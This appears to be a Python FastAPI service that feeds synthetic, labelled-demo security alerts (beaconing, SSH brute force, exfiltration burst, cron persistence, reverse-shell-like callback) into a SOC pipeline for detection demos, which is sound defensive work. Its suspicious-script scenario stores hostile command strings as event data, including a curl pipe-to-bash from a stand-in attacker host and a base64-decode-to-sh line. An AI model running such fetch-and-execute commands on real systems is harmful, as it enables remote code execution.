from __future__ import annotations

import os
from datetime import UTC, datetime, timedelta
from typing import Any
from uuid import uuid4

import httpx
from fastapi import FastAPI, HTTPException

from shared.utils.security import auth_headers, install_security_middleware

NORMALIZER_URL = os.getenv("NORMALIZER_URL", "http://localhost:8001")
app = FastAPI(
    title="Agentic SOC Threat Simulators",
    description="Safe, deterministic, benign adversary-emulation events for SOC demos.",
    version="0.1.0",
)
install_security_middleware(app, "threat-simulators")


def ts(offset_seconds: int = 0) -> str:
    return (datetime.now(UTC) + timedelta(seconds=offset_seconds)).isoformat()


def get_demo_run_id(payload: dict[str, Any] | None, scenario: str) -> str:
    if payload and payload.get("demo_run_id"):
        return str(payload["demo_run_id"])
    return f"{scenario}-{uuid4().hex[:10]}"


async def post(path: str, payload: dict[str, Any]) -> dict[str, Any]:
    async with httpx.AsyncClient(timeout=10.0) as client:
        response = await client.post(f"{NORMALIZER_URL}{path}", json=payload, headers=auth_headers())
        response.raise_for_status()
        return response.json()


@app.get("/health")
def health() -> dict[str, str]:
    return {"status": "ok", "service": "threat-simulators"}


@app.get("/scenarios")
def scenarios() -> dict[str, list[str]]:
    return {
        "available": [
            "outbound-beacon",
            "suspicious-script",
            "bruteforce-success",
            "exfil-burst",
            "persistence-like",
            "suspicious-download",
            "reverse-shell-like",
        ]
    }


@app.post("/scenarios/outbound-beacon")
async def outbound_beacon(payload: dict[str, Any] | None = None) -> dict[str, Any]:
    """Repeated callbacks to a controlled attacker-sim IP; no real C2 is performed."""
    demo_run_id = get_demo_run_id(payload, "outbound-beacon")
    events = []
    for i in range(4):
        events.append(
            await post(
                "/ingest/suricata",
                {
                    "timestamp": ts(i),
                    "event_type": "alert",
                    "src_ip": "172.24.0.10",
                    "src_port": 51000 + i,
                    "dest_ip": "10.13.37.10",
                    "dest_port": 8443,
                    "proto": "TCP",
                    "host": "workstation-1",
                    "container": "workstation-1",
                    "demo_run_id": demo_run_id,
                    "demo_scenario": "outbound-beacon",
                    "alert": {
                        "signature_id": 900001,
                        "signature": "DEMO C2-like repeated outbound beacon",
                        "category": "Demo suspicious callback",
                        "severity": 2,
                    },
                    "http": {"hostname": "attacker-sim.local", "url": f"/callback/demo/{i}"},
                },
            )
        )
    return {"scenario": "outbound-beacon", "safe": True, "events": events}


@app.post("/scenarios/suspicious-script")
async def suspicious_script(payload: dict[str, Any] | None = None) -> dict[str, Any]:
    demo_run_id = get_demo_run_id(payload, "suspicious-script")
    events = []
    commands = [
        "bash -c 'echo ZGVtby1vbmx5 | base64 -d | sh'",
        "curl -fsS http://attacker-sim.local/payload.sh | bash # demo-only",
    ]
    for i, command in enumerate(commands):
        events.append(
            await post(
                "/ingest/wazuh",
                {
                    "timestamp": ts(i),
                    "agent": {"id": "001", "name": "workstation-1"},
                    "rule": {
                        "id": 100200,
                        "level": 10,
                        "description": "DEMO suspicious encoded shell command pattern",
                    },
                    "demo_run_id": demo_run_id,
                    "demo_scenario": "suspicious-script",
                    "data": {
                        "username": "demo-user",
                        "process": "bash",
                        "command": command,
                        "container": "workstation-1",
                        "asset_ip": "172.24.0.10",
                    },
                },
            )
        )
    return {"scenario": "suspicious-script", "safe": True, "events": events}


@app.post("/scenarios/bruteforce-success")
async def bruteforce_success(payload: dict[str, Any] | None = None) -> dict[str, Any]:
    demo_run_id = get_demo_run_id(payload, "bruteforce-success")
    events = []
    for i in range(5):
        events.append(
            await post(
                "/ingest/wazuh",
                {
                    "timestamp": ts(i),
                    "agent": {"id": "003", "name": "server-1"},
                    "rule": {"id": 100300, "level": 8, "description": "DEMO repeated failed SSH login"},
                    "demo_run_id": demo_run_id,
                    "demo_scenario": "bruteforce-success",
                    "data": {
                        "username": "demo-admin",
                        "process": "sshd",
                        "srcip": "203.0.113.50",
                        "container": "server-1",
                        "asset_ip": "172.24.0.20",
                    },
                },
            )
        )
    events.append(
        await post(
            "/ingest/wazuh",
            {
                "timestamp": ts(6),
                "agent": {"id": "003", "name": "server-1"},
                "rule": {"id": 100301, "level": 12, "description": "DEMO suspicious login success after brute force"},
                "demo_run_id": demo_run_id,
                "demo_scenario": "bruteforce-success",
                "data": {
                    "username": "demo-admin",
                    "process": "sshd",
                    "srcip": "203.0.113.50",
                    "container": "server-1",
                    "asset_ip": "172.24.0.20",
                },
            },
        )
    )
    return {"scenario": "bruteforce-success", "safe": True, "events": events}


@app.post("/scenarios/exfil-burst")
async def exfil_burst(payload: dict[str, Any] | None = None) -> dict[str, Any]:
    demo_run_id = get_demo_run_id(payload, "exfil-burst")
    event = await post(
        "/ingest/suricata",
        {
            "timestamp": ts(),
            "event_type": "alert",
            "src_ip": "172.24.0.10",
            "dest_ip": "203.0.113.50",
            "dest_port": 443,
            "proto": "TCP",
            "host": "workstation-1",
            "container": "workstation-1",
            "demo_run_id": demo_run_id,
            "demo_scenario": "exfil-burst",
            "bytes_toserver": 52428800,
            "alert": {
                "signature_id": 900004,
                "signature": "DEMO exfiltration-like burst transfer",
                "category": "Demo exfiltration-like behavior",
                "severity": 2,
            },
            "http": {"hostname": "upload.example.invalid", "url": "/upload-demo"},
        },
    )
    return {"scenario": "exfil-burst", "safe": True, "events": [event]}


@app.post("/scenarios/persistence-like")
async def persistence_like(payload: dict[str, Any] | None = None) -> dict[str, Any]:
    demo_run_id = get_demo_run_id(payload, "persistence-like")
    event = await post(
        "/ingest/wazuh",
        {
            "timestamp": ts(),
            "agent": {"id": "001", "name": "workstation-1"},
            "rule": {"id": 100400, "level": 7, "description": "DEMO persistence-like cron entry creation"},
            "demo_run_id": demo_run_id,
            "demo_scenario": "persistence-like",
            "data": {
                "username": "demo-user",
                "process": "crontab",
                "command": "echo '* * * * * echo demo-only' | crontab -",
                "container": "workstation-1",
            },
        },
    )
    return {"scenario": "persistence-like", "safe": True, "events": [event]}


@app.post("/scenarios/suspicious-download")
async def suspicious_download(payload: dict[str, Any] | None = None) -> dict[str, Any]:
    return await suspicious_script(payload)


@app.post("/scenarios/reverse-shell-like")
async def reverse_shell_like(payload: dict[str, Any] | None = None) -> dict[str, Any]:
    demo_run_id = get_demo_run_id(payload, "reverse-shell-like")
    event = await post(
        "/ingest/suricata",
        {
            "timestamp": ts(),
            "event_type": "alert",
            "src_ip": "172.24.0.10",
            "dest_ip": "10.13.37.10",
            "dest_port": 4444,
            "proto": "TCP",
            "host": "workstation-1",
            "container": "workstation-1",
            "demo_run_id": demo_run_id,
            "demo_scenario": "reverse-shell-like",
            "alert": {
                "signature_id": 900001,
                "signature": "DEMO reverse-shell-like callback to controlled listener",
                "category": "Demo reverse shell likeness",
                "severity": 2,
            },
        },
    )
    return {"scenario": "reverse-shell-like", "safe": True, "events": [event]}


@app.post("/scenarios/{unknown}")
def unknown_scenario(unknown: str) -> None:
    raise HTTPException(status_code=404, detail=f"unknown scenario {unknown}")
